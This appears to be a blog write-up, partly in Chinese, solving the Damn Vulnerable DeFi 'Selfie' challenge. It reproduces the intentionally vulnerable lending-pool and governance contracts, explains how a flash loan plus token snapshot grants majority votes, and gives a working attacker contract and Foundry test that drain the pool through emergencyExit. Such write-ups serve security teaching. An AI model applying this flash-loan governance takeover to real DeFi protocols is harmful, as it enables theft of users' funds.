---
title: DamnVulnerableDeFi-6
date: 2023-12-29 15:48:44
tags:
    - DamnVulnerableDefi
categories: 
    - DamnVulnerableDefi
---
# Selfie
---
```
A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.
```

## Code
---
`SelfiePool.sol`:
<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../lib/openzeppelin-contracts/contracts/security/ReentrancyGuard.sol";
import "../../lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashLender.sol";
import "../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SimpleGovernance.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {
    ERC20Snapshot public immutable token;
    SimpleGovernance public immutable governance;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    error RepayFailed();
    error CallerNotGovernance();
    error UnsupportedCurrency();
    error CallbackFailed();

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        if (msg.sender != address(governance)) revert CallerNotGovernance();
        _;
    }

    constructor(address _token, address _governance) {
        token = ERC20Snapshot(_token);
        governance = SimpleGovernance(_governance);
    }

    function maxFlashLoan(address _token) external view returns (uint256) {
        if (address(token) == _token) return token.balanceOf(address(this));
        return 0;
    }

    function flashFee(address _token, uint256) external view returns (uint256) {
        if (address(token) != _token) revert UnsupportedCurrency();
        return 0;
    }

    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
        external
        nonReentrant
        returns (bool)
    {
        if (_token != address(token)) revert UnsupportedCurrency();

        token.transfer(address(_receiver), _amount);
        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) revert CallbackFailed();

        if (!token.transferFrom(address(_receiver), address(this), _amount)) {
            revert RepayFailed();
        }

        return true;
    }

    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
}
```

</details>

`ISimpleGovernance.sol`:
<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISimpleGovernance {
    struct GovernanceAction {
        uint128 value;
        uint64 proposedAt;
        uint64 executedAt;
        address target;
        bytes data;
    }

    error NotEnoughVotes(address who);
    error CannotExecute(uint256 actionId);
    error InvalidTarget();
    error TargetMustHaveCode();
    error ActionFailed(uint256 actionId);

    event ActionQueued(uint256 actionId, address indexed caller);
    event ActionExecuted(uint256 actionId, address indexed caller);

    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);

    function executeAction(uint256 actionId) external payable returns (bytes memory returndata);

    function getActionDelay() external view returns (uint256 delay);

    function getGovernanceToken() external view returns (address token);

    function getAction(uint256 actionId) external view returns (GovernanceAction memory action);

    function getActionCounter() external view returns (uint256);
}
```

</details>

`SimpleGovernance.sol`:
<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./ISimpleGovernance.sol";

/**
 * @title SimpleGovernance
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SimpleGovernance is ISimpleGovernance {
    uint256 private constant ACTION_DELAY_IN_SECONDS = 2 days;
    DamnValuableTokenSnapshot private _governanceToken;
    uint256 private _actionCounter;
    mapping(uint256 => GovernanceAction) private _actions;

    constructor(address governanceToken) {
        _governanceToken = DamnValuableTokenSnapshot(governanceToken);
        _actionCounter = 1;
    }

    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender)) revert NotEnoughVotes(msg.sender);

        if (target == address(this)) revert InvalidTarget();

        if (data.length > 0 && target.code.length == 0) {
            revert TargetMustHaveCode();
        }

        actionId = _actionCounter;

        _actions[actionId] = GovernanceAction({
            target: target,
            value: value,
            proposedAt: uint64(block.timestamp),
            executedAt: 0,
            data: data
        });

        unchecked {
            _actionCounter++;
        }

        emit ActionQueued(actionId, msg.sender);
    }

    function executeAction(uint256 actionId) external payable returns (bytes memory) {
        if (!_canBeExecuted(actionId)) revert CannotExecute(actionId);

        GovernanceAction storage actionToExecute = _actions[actionId];
        actionToExecute.executedAt = uint64(block.timestamp);

        emit ActionExecuted(actionId, msg.sender);

        (bool success, bytes memory returndata) =
            actionToExecute.target.call{value: actionToExecute.value}(actionToExecute.data);
        if (!success) {
            if (returndata.length > 0) {
                assembly {
                    revert(add(0x20, returndata), mload(returndata))
                }
            } else {
                revert ActionFailed(actionId);
            }
        }

        return returndata;
    }

    function getActionDelay() external pure returns (uint256) {
        return ACTION_DELAY_IN_SECONDS;
    }

    function getGovernanceToken() external view returns (address) {
        return address(_governanceToken);
    }

    function getAction(uint256 actionId) external view returns (GovernanceAction memory) {
        return _actions[actionId];
    }

    function getActionCounter() external view returns (uint256) {
        return _actionCounter;
    }

    /**
     * @dev an action can only be executed if:
     * 1) it's never been executed before and
     * 2) enough time has passed since it was first proposed
     */
    function _canBeExecuted(uint256 actionId) private view returns (bool) {
        GovernanceAction memory actionToExecute = _actions[actionId];

        if (actionToExecute.proposedAt == 0) {
            // early exit
            return false;
        }

        uint64 timeDelta;
        unchecked {
            timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt;
        }

        return actionToExecute.executedAt == 0 && timeDelta >= ACTION_DELAY_IN_SECONDS;
    }

    function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);
        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;
        return balance > halfTotalSupply;
    }
}
```

</details>

## Observation
- `SimpleGovernance`: 治理合约，实现了ISimpleGovernance接口，可以预先设置action，在两天后执行。
- `SelfiePool`:闪电贷，包括Snapshot和SimpleGovernance两种token。

## Vuln
- SelfiePool::emergencyExit
```solidity
function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
```
为了调用emergencyExit，得先成为`onlyGovernance`.
通过`SimpleGovernance::_hasEnoughVotes`
```solidity
function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);
        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;
        return balance > halfTotalSupply;
    }
```
得使`balance > halfTotalSupply;`,所以我们要用闪电贷。
同时`SimpleGovernance::queueAction`要求一定要是合约调用
```solidity
if (data.length > 0 && target.code.length == 0) {

	revert TargetMustHaveCode();

}
```

## Attack
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {SelfiePool, SimpleGovernance, DamnValuableTokenSnapshot} from "./SelfiePool.sol";
import "../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfiePoolAttacker is IERC3156FlashBorrower {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    address owner;
    uint256 actionId;

    constructor(address _pool, address _governance, address _token) {
        owner = msg.sender;
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
    }

    function attack(uint256 amount) public {
        // call flashloan
        pool.flashLoan(IERC3156FlashBorrower(this), address(token), amount, "0x");
    }

    function onFlashLoan(address initiator, address _token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        // queue action
        token.snapshot();
        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", owner));
        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAction() public {
        governance.executeAction(actionId);
    }
}
```

SelfiTest.t.sol：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../src/6-selfie/ISimpleGovernance.sol";
import "../../src/6-selfie/SimpleGovernance.sol";
import "../../src/6-selfie/SelfiePool.sol";
import "../../src/DamnValuableTokenSnapshot.sol";
import "../../src/6-selfie/SelfirAttack.sol";

contract SelfirTest is Test {
    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public dvttoken;

    address player;
    address deployer;

    function setUp() public {
        dvttoken = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(address(dvttoken));
        pool = new SelfiePool(address(dvttoken), address(governance));
        dvttoken.transfer(address(pool), TOKENS_IN_POOL);
        dvttoken.snapshot();
        //attacker = new SelfiePoolAttacker(address(pool), address(governance), address(dvttoken));
        player = makeAddr("player");
        deployer = makeAddr("deployer");
    }

    function testSetupIsdown() public {
        assertEq(governance.getActionCounter(), 1);

        assertEq(dvttoken.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(dvttoken)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(dvttoken), 0), 0);
    }

    function testExploit() public {
        /**
         * CODE YOUR SOLUTION HERE*
         */
        vm.startPrank(player);
        SelfiePoolAttacker attacker = new SelfiePoolAttacker(address(pool), address(governance), address(dvttoken));
        attacker.attack(TOKENS_IN_POOL);
        vm.warp(block.timestamp + 2 days);
        attacker.executeAction();
        vm.stopPrank();
        validation();
    }

    function validation() public {
        assertEq(dvttoken.balanceOf(address(player)), TOKENS_IN_POOL);
        assertEq(dvttoken.balanceOf(address(pool)), 0);
    }
}
```